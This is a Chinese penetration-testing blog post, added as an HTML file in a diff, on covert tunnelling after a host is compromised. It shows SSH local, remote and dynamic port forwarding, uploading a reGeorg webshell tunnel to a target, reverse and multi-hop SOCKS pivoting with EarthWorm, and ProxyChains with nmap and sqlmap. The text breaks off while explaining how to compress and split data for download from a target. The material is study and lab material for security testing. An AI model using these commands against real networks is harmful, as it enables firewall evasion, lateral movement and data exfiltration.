@@ -1,0 +1,253 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.9.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><title>隐藏通信隧道技术二 - Guko's Blog</title><meta name="description" content="在内网建立一个稳定、可靠的数据通道，具有重要意义。应用层隧道通信技术主要利用软件提供的端口来发送数据。常用的SSH、HTTP、HTTPS和DNS0x01 应用层隧道技术SSH协议几乎所有Linux\UNIX均支持SSH协议，一般情况SSH协议允许通过防火墙和边界设备。协议传输过程加密，难以区分合法与"><link type="text/css" rel="stylesheet" href="/css/pure.css?v=0.0.1"><link type="text/css" rel="stylesheet" href="/css/style.css?v=0.0.1"><script type="text/javascript" src="//cdn.bootcss.com/jquery/1.11.0/jquery.min.js"></script></head></html><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">隐藏通信隧道技术二</h1><a id="logo" href="/.">Guko's Blog</a></div><div id="nav-menu"><div class="bitcron_nav"><div class="site_nav_wrap"><div class="site_nav"><span class="a_container"><a href="/." class="selected active current">首页</a></span><span class="a_container"><a href="/archives/">归档</a></span><span class="a_container"><a href="/about/">关于</a></span><span class="a_container"><a href="/atom.xml">订阅</a></span></div></div></div></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">隐藏通信隧道技术二</h1><div class="post-meta">2020-04-26<script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" type="text/javascript"></script><span class="meta-space">  |  </span><span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv"></span><span> 浏览</span></span></div><!--文章内容--><div class="post-content"><p>在内网建立一个稳定、可靠的数据通道，具有重要意义。应用层隧道通信技术主要利用软件提供的端口来发送数据。常用的SSH、HTTP、HTTPS和DNS</p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/12.png" alt></p>
+<a id="more"></a>
+
+<h4 id="0x01-应用层隧道技术"><a href="#0x01-应用层隧道技术" class="headerlink" title="0x01 应用层隧道技术"></a>0x01 应用层隧道技术</h4><h5 id="SSH协议"><a href="#SSH协议" class="headerlink" title="SSH协议"></a>SSH协议</h5><p>几乎所有Linux\UNIX均支持SSH协议，一般情况SSH协议允许通过防火墙和边界设备。协议传输过程加密，难以区分合法与非合法。可利用SSH端口隧道突破防火墙的限制后，建立一些之前无法建立的TCP连接</p>
+<p>如命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@192.168.197.203</span><br></pre></td></tr></table></figure>
+
+<p>创建SSH隧道常用参数如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-c:压缩传输，提高传输速度</span><br><span class="line">-f:将SSH传输转入后台执行，不占用当前的shell</span><br><span class="line">-N:建立静默连接（建立了连接，但是看不到具体会话）</span><br><span class="line">-g:允许远程主机连接本地用于转发的端口</span><br><span class="line">-L:本地端口转发</span><br><span class="line">-R:远程端口转发</span><br><span class="line">-D:动态转发（SOCKS代理）</span><br><span class="line">-P:指定SSH端口</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.本地转发</strong></p>
+<p>测试环境如下：<br>  外部vps可以访问内网web服务器，但是不能访问数据库服务器，内网web服务器可以和数据库服务器互相访问。<br>测试目标：以web服务器为跳板，访问数据库服务器的3389端口</p>
+<p>修改ssh服务器配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/etc/ssh/sshd_config</span><br><span class="line">– PermitRootLogin yes</span><br><span class="line">– Port 22</span><br><span class="line">– PasswordAuthentication yes</span><br><span class="line">▪ service ssh restart</span><br></pre></td></tr></table></figure>
+
+<p>模拟实验环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali1攻击机vps：192.168.197.160</span><br><span class="line">kali2跳板机web服务器：192.168.197.190</span><br><span class="line">windows10目标机数据库服务器：192.168.197.174</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh -fCNg -L &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;ssh server&gt; -p &lt;ssh server port&gt;</span><br><span class="line"></span><br><span class="line">ssh -fCNg -L 1153(VPS端口):192.168.197.174（目标主机）:3389（目标端口） root@192.168.197.190（跳板机）</span><br><span class="line"></span><br><span class="line">ssh -fCNg -L 1153:192.168.197.174:3389 root@192.168.197.190</span><br></pre></td></tr></table></figure>
+
+<p><code>netstat -anptl | grep 1153</code> 查看本地<code>1153</code>端口，可以看到<code>1153</code>端口已经开启侦听</p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/1.png" alt></p>
+<p>使用rdesktop连接vps的1153端口，可以发现已经与数据服务器192.168.197.174的3389建立了连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:1153</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/26/隐藏通信隧道技术二/2.png" alt></p>
+<p>SSH进程的本地端口映射可以将本地（客户机）的某个端口转发到远端指定机器的指定端口，本地端口转发则是在本地（客户机）监听一个端口，所有访问这个端口的数据都会通过SSH隧道传输到远端的对应端口</p>
+<p><strong>2.远程转发</strong></p>
+<p>测试环境如下：<br>  小型内网，包含三台机器；内网没有边界设备，所以外部的vps不能访问内网中的三台机器；内网web服务器可以访问外网vps，数据库服务器和域控服务器均不能访问外网的vps。<br>测试目标：通过外网vps访问数据库服务器的3389端口</p>
+<p>模拟实验环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali1攻击机vps：192.168.197.160</span><br><span class="line">kali2跳板机web服务器：192.168.197.190</span><br><span class="line">windows10目标机数据库服务器：192.168.197.174</span><br></pre></td></tr></table></figure>
+
+<p>在web服务器上执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -fNg -R &lt;listen port&gt;:&lt;remote ip&gt;:&lt;remote port&gt; user@&lt;SSH server&gt; -p &lt;ssh server port&gt;</span><br><span class="line">ssh -fCNg -R 3307:192.168.197.174:3389 root@192.168.197.160</span><br><span class="line">ssh -fCNg -R 3307:192.168.197.174:3389 root@192.168.197.160</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/26/隐藏通信隧道技术二/3.png" alt></p>
+<p>查看远程 vps(192.168.197.160)发现已经开启对3307端口的监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anptl | grep 3307</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/26/隐藏通信隧道技术二/5.png" alt></p>
+<p>访问vps的3307端口，即可与数据库服务器的3389端口建立连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 127.0.0.1:3307</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/26/隐藏通信隧道技术二/4.png" alt></p>
+<p>本地转发是将远程主机（服务器）某个端口的数据转发到本地机器的指定端口。远程端口转发则是在远程主机上监听一个端口，所有访问远程服务器指定端口的数据都会通过SSH隧道传输到本地的对应端口</p>
+<p><strong>3.动态转发</strong></p>
+<p>模拟实验环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali1攻击机vps：192.168.197.160</span><br><span class="line">kali2跳板机web服务器：192.168.197.190</span><br><span class="line">windows10目标机数据库服务器：192.168.197.204</span><br><span class="line">域控服务器:x.x.x.x</span><br></pre></td></tr></table></figure>
+
+<p>在vps上执行如下命令,建立一个动态的socks代理通道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -fCNg -D 7000 root@192.168.197.190</span><br></pre></td></tr></table></figure>
+
+<p>查看本地7000端口的监听是否已经启动，可以看到ssh正在监听7000端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulnp | grep &quot;:7000&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/26/隐藏通信隧道技术二/6.png" alt></p>
+<p>然后在本地打开浏览器并设置网络代理，通过浏览器访问内网域控制器地址</p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/7.png" alt></p>
+<p>动态端口映射就是建立一个SSH加密的SOCKS 4/5代理通道。任何支持SOCKS 4/5协议的程序都可以使用这个加密通道进行代理访问</p>
+<h5 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP/HTTPS协议"></a>HTTP/HTTPS协议</h5><p>HTTP Service代理用于将所有的流量转发到内网。常见代理工具reGeorg、meterpreter、tunna</p>
+<p>reGeorg主要功能是把内网服务器端口的数据通过HTTP/HTTPS隧道转发到本机，实现基于HTTP协议的通信</p>
+<p>下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/8.png" alt></p>
+<p>将脚本文件上传到目标服务器，使用攻击机在本地访问远程服务器上的<code>tunnel.jsp</code>文件。返回后，利用reGeorgSocksProxy.py脚本监听本地9999端口，建立一个通信链路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp -p 9999</span><br></pre></td></tr></table></figure>
+
+<p>查看本地9999端口是否已经开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp</span><br></pre></td></tr></table></figure>
+
+<p>隧道正常后，可以在本地kali linux机器上使用<code>ProxyChains</code>之类的工具访问内网</p>
+<h4 id="0x02-SOCKS代理"><a href="#0x02-SOCKS代理" class="headerlink" title="0x02 SOCKS代理"></a>0x02 SOCKS代理</h4><p>常见的网络场景如下三类：</p>
+<ul>
+<li>服务器在内网中，可以任意访问外部网络</li>
+<li>服务器在内网中，可以任意访问外部网络，但服务器安装了防火墙来拒绝敏感端口的连接</li>
+<li>服务器在内网中，对外只开放了部分端口（例如80端口），且服务器不能访问外部网络</li>
+</ul>
+<h5 id="常用的SOCKS代理工具"><a href="#常用的SOCKS代理工具" class="headerlink" title="常用的SOCKS代理工具"></a>常用的SOCKS代理工具</h5><p>SOCKS是一种代理服务，可简单将一端系统连接到另一端。SOCKS支持多种协议，包括HTTP、FTP等。SOCKS分为SOCKS4和SOCKS5两种类型：SOCKS4只支持TCP协议，SOCKS5不仅支持TCP/UDP协议，还支持各种身份验证机制，标准端口为1080。SOCKS能够与目标内网计算机进行通信，避免多次使用端口转发</p>
+<p>SOCKS代理可理解为增强版lcx。它的服务端监听一个服务端口，当有新的连接请求出现时，会先从SOCKS协议中解析出目标的URL的目标端口，再执行lcx的具体功能，在选择SOCKS代理工具的时候尽量选没有GUI界面，不需要安装其他依赖软件的SOCKS代理工具，支持多平台优先</p>
+<p>常见内网渗透测试环境：</p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/9.png" alt></p>
+<p><strong>1.EarthWorm</strong></p>
+<p>EarthWorm(EW)具有SOCKS5服务器架设和端口转发两大核心功能，可在复杂网络环境下完成网络穿透。</p>
+<p>EW能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p>
+<p>EW提供了多种可执行文件，以适用不同的操作系统，Linux、Windows、MacOS、Arm-Linux 均被包括其内</p>
+<p>下载地址：<a href="https://github.com/rootkiter/EarthWorm" target="_blank" rel="noopener">https://github.com/rootkiter/EarthWorm</a></p>
+<p><strong>2.reGeorg</strong></p>
+<p>reGeorg主要功能是把内网服务器的端口通过HTTP/HTTPS隧道转发到本机，形成一个回路</p>
+<p>reGeorg可以使目标服务器在内网中（或者设置了端口策略的情况下）连接内部开放端口。reGeorg利用webshell建立一个SOCKS代理进行内网穿透，服务器必须支持ASPX、PHP、JSP中的一种</p>
+<p>下载地址：<a href="https://github.com/sensepost/reGeorg" target="_blank" rel="noopener">https://github.com/sensepost/reGeorg</a></p>
+<p><strong>3.sSocks</strong></p>
+<p>sSocks是SOCKS代理工具套装，可用来开启SOCKS代理服务。sSocks支持SOCKS5验证，支持IPv6和UDP,并提供反向SOCKS代理服务（将远程计算机作为SOCKS代理服务端反弹到本地）</p>
+<p><strong>4.SocksCap64</strong></p>
+<p>SocksCap64是一款windows环境下的全局代理</p>
+<p>SocksCap64可以使windows应用程序通过SOCKS代理服务器来访问网络，二不需要对这些程序进行任何修改。即使那些不支持SOCKS代理的应用程序，也可以通过SocksCap64实现代理访问</p>
+<p>下载地址：<a href="https://www.sockscap64.com/forums/topic/sockscap64-v3-3" target="_blank" rel="noopener">https://www.sockscap64.com/forums/topic/sockscap64-v3-3</a></p>
+<p><strong>5.Proxifier</strong></p>
+<p>Proxifier是一款好使的全局代理软件。Proxifier提供了跨平台的端口转发和代理功能，适用于windows、Linux、MacOS平台</p>
+<p><strong>6.ProxyChains</strong></p>
+<p>ProxyChains是一款可以在Linux下实现全局代理的软件，性能稳定、可以靠，可以使用任何程序通过代理上网，允许TCP和DNS流程通过代理隧道，支持HTTP、SOCKS4、SOCKS5类型的代理服务器</p>
+<p>下载地址：<a href="http://proxychains.sourceforge.net/" target="_blank" rel="noopener">http://proxychains.sourceforge.net/</a></p>
+<h5 id="SOCKS代理技术在网络环境中的应用"><a href="#SOCKS代理技术在网络环境中的应用" class="headerlink" title="SOCKS代理技术在网络环境中的应用"></a>SOCKS代理技术在网络环境中的应用</h5><p><strong>1.EarthWorm使用</strong></p>
+<p>EW有六种命令格式，分别是<code>ssocksd、restocks、lcx_slave、lcx_listen、lcx_tran</code>用于普通网络的正向连接命令是<code>ssocksd</code>用于反弹连接的命令是<code>rcsocks、rssocks</code></p>
+<p>正向代理是指主动通过代理来访问目标机器，反向代理是指目标机器通过代理进行主动连接</p>
+<p>测试环境：</p>
+<p>假设已获取一台web服务器的权限，服务器的内网IP弟子为10.48.128.25,web服务器是连接外网和内网的关键节点，内网其他服务器之间不能直接连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">vps:139.*.*.113</span><br><span class="line">web服务器(windows server 2003):10.48.128.25</span><br><span class="line"></span><br><span class="line">服务器:10.48.128.20 端口:3389</span><br><span class="line">web服务器:10.48.128.49 端口:22,80</span><br><span class="line">数据库服务器:10.48.128.48 端口:3306</span><br><span class="line">路由器:10.48.128.22 端口:80</span><br></pre></td></tr></table></figure>
+
+<p>(1) 正向SOCKS5服务器</p>
+<p>目标机器拥有一个外网IP地址的情况，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p>即可架设一个端口为888的代理。之后使用SocksCap64添加这个IP的代理即可</p>
+<p>(2) 反弹SOCKS 5服务器</p>
+<p>目标机器没有公网IP地址的情况如下，（使其可以访问内网资源）</p>
+<p>第一，上传EW到vps139.<em>.</em>.113上，执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1008 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>意思为：在vps上添加一个转接隧道，把1080端口收到的代理请求转发给888</p>
+<p>第二，上传EW到web服务器10.48.128.25上，执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 139.*.*.113 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>意思为：在IP地址10.48.128.25的服务器上启动SOCKS5服务器，反弹到VPS上的888端口</p>
+<p>之后即可在VPS命令行界面，看到反弹成功</p>
+<p>(3) 二级网络环境</p>
+<p>测试环境：</p>
+<p>假设已获取A主机和B主机权限。A主机配有两块网卡，一块能丽连接外网，另一块（10.48.128.25）只能连接内网中的B主机，但无法访问内网中的其他资源。B主机可以访问内网资源，无法访问外网。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">A主机（有公网地址，不能访问内网）:139.*.*113,10.48.128.25</span><br><span class="line"></span><br><span class="line">B主机（不能访问外网，可以访问内网）:10.48.128.49</span><br><span class="line">服务器：10.48.128.20 端口：3389</span><br><span class="line">数据库服务器：10.48.128.48 端口：3306</span><br><span class="line">路由器：10.48.128.22 端口：80</span><br></pre></td></tr></table></figure>
+
+<p>第一，将EW上传B主机，利用<code>ssocksd</code>方式启动888端口的SOCKS代理，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888</span><br></pre></td></tr></table></figure>
+
+<p>第二，将EW上传到A主机中，执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_tran -l 1080 -f 10.48.128.49 -g 888</span><br></pre></td></tr></table></figure>
+
+<p>意思是：将1080端口收到的代理请求转发给B主机10.28.128.49的888端口，如此即可通过A主机（139.<em>.</em>113）的外网1080端口使用B主机上架设的SOCKS5代理</p>
+<p>(4) 二级网络环境</p>
+<p>测试环境：</p>
+<p>假设已获取A主机权限根B主机权限。A主机既没有公网IP地址，也无法访问内网资源。B主机可以访问内网资源，但无法访问外网。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">VPS:139.*.*.113</span><br><span class="line">A主机（没有公网地址，不能访问内网）:10.48.128.25</span><br><span class="line"></span><br><span class="line">B主机（不能访问外网，可以访问内网）:10.48.128.49</span><br><span class="line">服务器：10.48.128.20 端口：3389</span><br><span class="line">数据库服务器：10.48.128.48 端口：3306</span><br><span class="line">路由器：10.48.128.22 端口：80</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>lcx_listen</code>命令和<code>lcx_slave</code>命令</p>
+<p>第一，将EW上传到VPS上，执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 10800 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>意思是：在公网VPS上添加转接隧道，将10800端口收到的代理请求转发给888端口</p>
+<p>第二，将EW上转到B主机中，并利用<code>ssocksd</code>方式启动999端口的SOCKS代理，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 999</span><br></pre></td></tr></table></figure>
+
+<p>第三，将EW上传到A主机中，执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 139.*.*.113 -e 888 -f 10.48.128.49 -g 999</span><br></pre></td></tr></table></figure>
+
+<p>意思是:在A主机上利用<code>lcx_slave</code>方式，将公网VPS的888端口和B主机的999端口连接起来。</p>
+<p>最后，VPS上可看到连接成功信息，在VPS到的10800端口使用在B主机上假设的SOCKS5代理</p>
+<p>（5）三级网络环境</p>
+<p>如下为三级联命令</p>
+<p>测试环境：</p>
+<p>内网A主机没有公网IP地址，但可访问外网；B主机不能访问外网，但可被A主机访问；C主机可被B主机访问，且可访问核心区域。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VPS:139.*.*.113</span><br><span class="line">A主机（没有公网IP地址，可以访问外网）：192.168.1.1</span><br><span class="line"></span><br><span class="line">B主机（不能访问外网，可以被A主机访问）：10.48.128.12</span><br><span class="line">服务器：10.48.128.20 端口：3389</span><br><span class="line"></span><br><span class="line">C主机（可以访问核心区域，可以被B主机访问）：192.168.0.10</span><br><span class="line">服务器:192.168.0.11 端口：80</span><br><span class="line"></span><br><span class="line">核心区域......</span><br></pre></td></tr></table></figure>
+
+<p>在公网VPS执行如下命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 888</span><br></pre></td></tr></table></figure>
+
+<p>在A主机上执行如下命令，将公网VPS的888端口和B主机的999端口连接起来</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 139.*.*.113 -e 888 -f 10.48.128.12 -g 999</span><br></pre></td></tr></table></figure>
+
+<p>在B主机上执行如下命令，将999端口收到的代理请求转发给777端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 999 -e 777</span><br></pre></td></tr></table></figure>
+
+<p>在C主机上启动SOCKS5服务器，并反弹到B主机的777端口上，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 10.48.128.12 -e 777</span><br></pre></td></tr></table></figure>
+
+<p>如此即可通过公网VPS带1080端口使用在C主机上架设的SOCKS 5代理</p>
+<p><strong>2.在windows下使用SocksCap64实现内网漫游</strong></p>
+<p>SocksCap64 管理员权限打开程序，单击<code>代理</code>按钮添加一个代理，设置一个代理服务器的IP地址和端口即可。之后使用闪电⚡️图标测试当前代理服务器是否可以连接。在快捷菜单栏中单击<code>在代理隧道中运行选中程序</code>即可访问内网资源。</p>
+<p><strong>3.在Linux下使用ProxyChains实现内网漫游</strong></p>
+<p>kali中的prochains,需要做一点配置,打开配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>删除<code>dynamic_chain</code>的注释，把<code>socks4 127.0.0.1 9050</code>改成想要访问的端口的信息</p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/10.png" alt></p>
+<p><img src="/2020/04/26/隐藏通信隧道技术二/11.png" alt></p>
+<p>测试代理服务器是否能正常工作，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxyresolv www.baidu.com</span><br></pre></td></tr></table></figure>
+
+<p>若显示<code>未找到命令</code>输入如下命令，即可访问内网资源</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/lib/proxychains3/proxyresolv /usr/bin/</span><br></pre></td></tr></table></figure>
+
+<p>访问格式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap</span><br><span class="line">proxychains sqlmap</span><br><span class="line">proxychains firefox</span><br><span class="line">proxychains .......</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-压缩数据"><a href="#0x03-压缩数据" class="headerlink" title="0x03 压缩数据"></a>0x03 压缩数据</h4><p>渗透测试，下载数据是一项重要工作</p>
+<h4 id="RAR"><a href="#RAR" class="headerlink" title="RAR"></a>RAR</h4><p>RAR提供了强力压缩、分类、加密和自解压模块。如果目标机器上没有WinRAR,可在本地下载并安装后把WinRAR安装目录里面的rar.exe提取出来，上传到目标机器中（注：为避免出错，安装WinRAR操作系统版本和目标机器的操作系统版本必须相同）</p>
+<p>常用参数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">e:解压到当前根目录下</span><br><span class="line">x:以绝对路径解压</span><br><span class="line">-a:添加要压缩的文件</span><br><span class="line">-k:锁定压缩文件</span><br><span class="line">-s:生成存档文件（这样可以提高压缩比）</span><br><span class="line">-p:指定压缩密码</span><br><span class="line">-r:递归压缩，包括子目录</span><br><span class="line">-x:指定要排除的文件</span><br><span class="line">-v:分卷打包，在打包打文件时用处很大</span><br><span class="line">-ep:从名称中排出路径</span><br><span class="line">-ep1:从名称中排出基本目录</span><br><span class="line">-m0:存储，添加到压缩文件时不压缩文件</span><br><span class="line">-m1:最快，使用最快压缩方式（低压缩比）</span><br><span class="line">-m2:较快，使用快速压缩方式</span><br><span class="line">-m3:标准，使用标准压缩方式（默认）</span><br><span class="line">-m4:较好，使用较强压缩方式（速度较慢）</span><br><span class="line">-m5:最好，使用最强压缩方式（最好的压缩方式，但速度最慢）</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.以RAR格式压缩/解压</strong></p>
+<p>把<code>E:\webs\</code>目录下的所有内容（包含子目录）打包为<code>1.rar</code>放到<code>E:\webs\</code>目录下，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rar.exe a -k -r -s -m3 E:\webs\1.rar E:\webs</span><br></pre></td></tr></table></figure>
+
+<p>把打包的<code>E:\webs\1.rar</code>文件解压到当前根目录下，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rar.exe E:\webs\1.rar</span><br></pre></td></tr></table></figure>
+
+<p><code>ZIP</code>格式压缩/解压的命令和RAR一样，只需把后缀改成<code>.zip</code></p>
+<p><strong>2.分卷压缩/解压</strong></p>
+<p>分卷压缩E盘API目录下的所有文件及文件夹（使用-r参数进行递归压缩），设置每个分卷为20MB,结构为test.part01.rar、test.part02.rar、test.part03.rar命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rar.exe a -m0 -r -v20m E:\test.rar E:\API</span><br></pre></td></tr></table></figure>
+
+<p>将E:\test.part01.rar解压到E盘的xl目录下，命令如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rar.exe x E:\test.part01.rar E:\xl</span><br></pre></td></tr></table></figure>
+
+<h5 id="7-Zip"><a href="#7-Zip" class="headerlink" title="7-Zip"></a>7-Zip</h5><p>7-Zip支持7Z、XZ、BZIP、GZIP、TAR、ZIP、WIM等格式的压缩和解压缩。如果目标机器上没有安装，可在本地下载安装后，把7-Zip安装目录里的7z.exe文件提取出来，上传到目标机器中</p>
+<p>下载地址：<a href="https://www.7-zip.org/" target="_blank" rel="noopener">https://www.7-zip.org/</a></p>
+<p>常见使用参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-r:递归压缩</span><br><span class="line">-o:指定输出目录</span><br><span class="line">-p:指定密码</span><br><span class="line">-v:分卷压缩（设置要适当，否则文件会非常多）</span><br><span class="line">a:添加压缩文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>1.普通压缩/解压方式</strong></p>
+<p>把<code>E:\webs\</code>目录下的所有内容（包含子目录）打包为<code>1.7z</code>放到<code>E:\webs\</code>目录下，压缩密码为“12345”，命令如下</p>
